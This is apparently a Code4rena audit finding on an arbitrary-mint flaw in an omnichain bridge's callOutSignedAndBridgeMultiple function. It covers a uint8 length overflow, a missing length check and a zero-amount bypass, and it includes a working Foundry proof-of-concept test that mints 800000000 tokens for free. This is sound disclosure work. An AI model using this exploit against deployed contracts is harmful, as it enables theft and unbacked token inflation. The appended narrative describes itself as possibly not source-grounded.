---
id: 18575
severity: "High"
---

# An attacker can mint an arbitrary amount of `hToken` on `RootChain`

## Description

```solidity
An adversary can construct an attack vector that let’s them mint an arbitrary amount of hToken’s on the `RootChain`.

The attack will start on a Branch Chain where we have some underlying ERC20 `token` and a corresponding `hToken` that represents `token` within the omnichain system. The `callOutSignedAndBridgeMultiple(...)` function is supposed to bridge multiple tokens to a destination chain and also carry the `msg.sender` so that the tokens can be credited to `msg.sender`’s `VirtualAccount`. The attacker will call the function with `DepositMultipleInputParams` `_dParams` that take advantage of several weaknesses contained within the function. 

Below is an overview of the `DepositMultipleInput` struct and flow diagram of `BranchBridgeAgent`:
    
    struct DepositMultipleInput {
        //Deposit Info
        address[] hTokens; //Input Local hTokens Address.
        address[] tokens; //Input Native / underlying Token Address.
        uint256[] amounts; //Amount of Local hTokens deposited for interaction.
        uint256[] deposits; //Amount of native tokens deposited for interaction.
        uint24 toChain; //Destination chain for interaction.
    }
    
    flowchart TB
    A["callOutSignedAndBridgeMultiple(,DepositMultipleInput memory _dParams,)"] 
    -->|1 |B["_depositAndCallMultiple(...)"]
        B --> |2| C["_createDepositMultiple(...)"]
        B --> |4| D["__performCall(_data)"]
        C --> |3| E["IPort(address).bridgeOutMultiple(...)"]
```

Weakness **#1** is that the supplied array of tokens `address[] hTokens` in `_dParams` is not checked if it exceeds 256. This causes an obvious issue where if `hTokens` length is `>` 256, the recorded length in `packedData` will be wrong since it’s using an unsafe cast to `uint8` and will overflow: `uint8(_dParams.hTokens.length)`.
    
```solidity
    function callOutSignedAndBridgeMultiple(
            bytes calldata _params,
            DepositMultipleInput memory _dParams,
            uint128 _remoteExecutionGas
        ) external payable lock requiresFallbackGas {
            // code ...
    
            //Encode Data for cross-chain call.
            bytes memory packedData = abi.encodePacked(
                bytes1(0x06),
                msg.sender,
                uint8(_dParams.hTokens.length),
                depositNonce,
                _dParams.hTokens,
                _dParams.tokens,
                _dParams.amounts,
                _deposits,
                _dParams.toChain,
                _params,
                msg.value.toUint128(),
                _remoteExecutionGas
            );
    				
    				// code ...
    				_depositAndCallMultiple(...);
        }
```

Weakness **#2** arises in the subsequent internal function `_depositAndCallMultiple(...)`, where the only check performed on the supplied `hTokens`, `tokens`, `amounts` and `deposits` arrays is if the lengths match; however, there is no check if the length is the same as the one passed earlier to `packedData`.
    
```solidity
    function _depositAndCallMultiple(
            address _depositor,
            bytes memory _data,
            address[] memory _hTokens,
            address[] memory _tokens,
            uint256[] memory _amounts,
            uint256[] memory _deposits,
            uint128 _gasToBridgeOut
        ) internal {
            //Validate Input
            if (
                _hTokens.length != _tokens.length || _tokens.length != _amounts.length
                    || _amounts.length != _deposits.length
            ) revert InvalidInput();
    
            //Deposit and Store Info
            _createDepositMultiple(_depositor, _hTokens, _tokens, _amounts, _deposits, _gasToBridgeOut);
    
            //Perform Call
            _performCall(_data);
        }
```

Lastly, weakness **#3** is that `bridgeOutMultiple(...)`, called within `_createDepositMultiple(...)`, allows for supplying any address in the `hTokens` array since it only performs operations on these addresses if `_deposits[i] > 0` or `_amounts[i] - _deposits[i] > 0`. In other words, if we set `deposits[i] = 0` and `amounts[i] = 0`, we can supply ANY address in `hTokens[i]`.
    
```solidity
    function bridgeOutMultiple(
            address _depositor,
            address[] memory _localAddresses,
            address[] memory _underlyingAddresses,
            uint256[] memory _amounts,
            uint256[] memory _deposits
        ) external virtual requiresBridgeAgent {
            for (uint256 i = 0; i < _localAddresses.length;) {
                if (_deposits[i] > 0) {
                    _underlyingAddresses[i].safeTransferFrom(
                        _depositor,
                        address(this),
                        _denormalizeDecimals(_deposits[i], ERC20(_underlyingAddresses[i]).decimals())
                    );
                }
                if (_amounts[i] - _deposits[i] > 0) {
                    _localAddresses[i].safeTransferFrom(_depositor, address(this), _amounts[i] - _deposits[i]);
                    ERC20hTokenBranch(_localAddresses[i]).burn(_amounts[i] - _deposits[i]);
                }
                unchecked {
                    i++;
                }
            }
        }
```

## Proof of Concept

```solidity
_Note: An end-to-end coded PoC is at the end of PoC section._

Copy the two functions `testArbitraryMint` and `_prepareAttackVector` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testArbitraryMint -vv`

The result is `800000000` in minted tokens for free in the attacker’s `VirtualAccount`.
    
    function testArbitraryMint() public {
            
            // setup function used by developers to add local/global tokens in the system
            testAddLocalTokenArbitrum();
    
            // set attacker address & mint 1 ether to cover gas cost
            address attacker = address(0xAAAA);
            hevm.deal(attacker, 1 ether);
            
            // get avaxMockAssetHtoken global address that's on the Root
            address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);
        
            // prepare attack vector
            bytes memory params = "";
            DepositMultipleInput memory dParams = _prepareAttackVector();
            uint128 remoteExecutionGas = 200_000_000_0;
    
            console2.log("------------------");
            console2.log("------------------");
            console2.log("ARBITRARY MINT LOG");
    
            console2.log("Attacker address", attacker);
            console2.log("Avax h token address", avaxMockAssethToken);
            console2.log("Avax underlying address", address(avaxMockAssetToken));
    
            console2.log("Attacker h token balance", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));
            console2.log("Attacker underlying balance", avaxMockAssetToken.balanceOf(attacker));
    
            // execute attack
            hevm.prank(attacker);
            avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value: 0.00005 ether}(params, dParams, remoteExecutionGas);
            
            // get attacker's virtual account address
            address vaccount = address(rootPort.getUserAccount(attacker));
    
            console2.log("Attacker h token balance avax", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));        
            console2.log("Attacker underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
    
            console2.log("Attacker h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));
        
            console2.log("ARBITRARY MINT LOG END");
    		    console2.log("------------------");
    
        }
    
        function _prepareAttackVector() internal view returns(DepositMultipleInput memory) {
            
            // hToken address
            address addr1 = avaxMockAssethToken;
    
            // underlying address
            address addr2 = address(avaxMockAssetToken);
    
            // 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000 
            address malicious_address = address(0x2FAF0800);
            
            uint256 amount1 = 0;
            uint256 amount2 = 0;
    
            uint num = 257;
            address[] memory htokens = new address[](num);
            address[] memory tokens = new address[](num);
            uint256[] memory amounts = new uint256[](num);
            uint256[] memory deposits = new uint256[](num);
    
            for(uint i=0; i<num; i++) {
                htokens[i] = addr1;
                tokens[i] = addr2;
                amounts[i] = amount1;
                deposits[i] = amount2;
            }
        
            // address of the underlying token
            htokens[1] = addr2;
          
            // copy of entry containing the arbitrary number of tokens
            htokens[2] = malicious_address;
            
            // entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Root
            htokens[3] = malicious_address;
           
            uint24 toChain = rootChainId;
    
            // create input
            DepositMultipleInput memory input = DepositMultipleInput({
                hTokens:htokens,
                tokens:tokens,
                amounts:amounts,
                deposits:deposits,
                toChain:toChain
            });
    
            return input;
    
        }
```

## Recommendation

Enforce stricter checks around input param validation on bridging multiple tokens.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an arbitrary‑mint flaw in the cross‑chain bridging logic of the RootChain system. It originates from three intertwined weaknesses in the function that bridges multiple tokens from a branch chain to the root chain. First, the caller can supply more than 256 hToken addresses in the DepositMultipleInput struct, but the contract stores the length in a uint8 field when encoding the cross‑chain payload. This unsafe cast causes an overflow, so the recorded length in the packed data is incorrect and the subsequent processing reads a truncated length. Second, the internal helper _depositAndCallMultiple only checks that the four input arrays (hTokens, tokens, amounts, deposits) have matching lengths, but it does not verify that this length matches the (overflowed) length that was encoded earlier. Consequently, the contract proceeds with a mismatched array size without rejecting the call. Third, the bridgeOutMultiple routine, which is invoked during the deposit creation, iterates over the supplied hToken addresses and performs actions only when either the deposit amount or the net amount (amount‑deposit) is greater than zero. By setting both values to zero for a chosen entry, an attacker can include any arbitrary address in the hTokens array and bypass the token‑specific logic. When the malicious hToken address reaches the root chain, the bridge logic treats it as a legitimate token and mints the corresponding amount of hToken to the attacker’s virtual account, even though no underlying assets were transferred. The exploit can be carried out by calling callOutSignedAndBridgeMultiple with a crafted DepositMultipleInput that contains 257 entries, includes a malicious hToken address, and sets all amounts and deposits to zero. The result is that the attacker receives a large amount of newly minted hToken on the root chain without providing any collateral. From a user’s perspective the symptoms are that the attacker’s balance of the hToken suddenly jumps to a huge value while the underlying token balance remains unchanged, violating the expected accounting invariant that hToken supply should be backed by locked underlying assets. This flaw affects any participant who can invoke the bridging function, undermines the token’s economic model, and can lead to uncontrolled inflation of the hToken supply. The issue was discovered during a Code4rena audit through manual code review and a proof‑of‑concept test that demonstrated the arbitrary mint. It is hard to notice because the overflow occurs in a low‑level encoding step and the zero‑amount check appears to be a harmless optimization. To remediate the problem the contract should enforce strict bounds on the hToken array length, use a size‑appropriate type for encoding (e.g., uint16 or uint256), validate that the length stored in the payload matches the actual array length, reject any hToken address that is not registered in the system, and require that at least one of the deposit or net amount fields is non‑zero for each entry, thereby preventing the zero‑value bypass that enables arbitrary minting.
